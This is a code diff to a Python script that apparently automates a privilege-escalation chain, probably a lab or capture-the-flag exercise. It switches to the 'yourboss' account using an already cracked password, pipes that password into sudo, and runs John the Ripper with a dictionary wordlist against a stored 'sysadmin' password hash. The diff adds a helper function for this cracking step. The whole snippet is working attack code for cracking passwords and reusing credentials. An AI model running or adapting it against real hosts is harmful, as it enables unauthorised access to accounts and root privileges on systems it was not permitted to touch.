@@ -34,10 +34,17 @@ def exec_cmd_as_user(user, password, command):
 		return "Error: Process timed out"
 
 	else:
-                print('here')
                 spawned.sendline(password)
-                time.sleep(60*2)
                 return spawned.read().decode('utf-8')
+
+
+def exec_john_cmd_as_user(user, password, command):
+        """ Executes the given john command (adding a pause to allow for calculation) as user elevated using sudo. """
+        spawned = pexpect.spawn('su %s -c "echo %s | sudo -S %s"' % (user, password, command))
+        ret_status = spawned.expect('assword:') # Catch both 'password:' and 'Password:'
+        spawned.sendline(password)
+        time.sleep(60*2)
+        return spawned.read().decode('utf-8')
 
 
 # We already know tempuser's password
@@ -71,7 +78,9 @@ print(yourboss_cracked)
 with open('temp_hash.txt', 'w') as temp_hash:
     temp_hash.write(sysadmin_hash)
 
-print(exec_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small temp_hash.txt'))
+# TODO: Determine if john.pot exists and if so, remove it
+
+print(exec_john_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small temp_hash.txt'))
 
 '''
 spawned = pexpect.spawn('su yourboss -c "echo %s | sudo -S "')
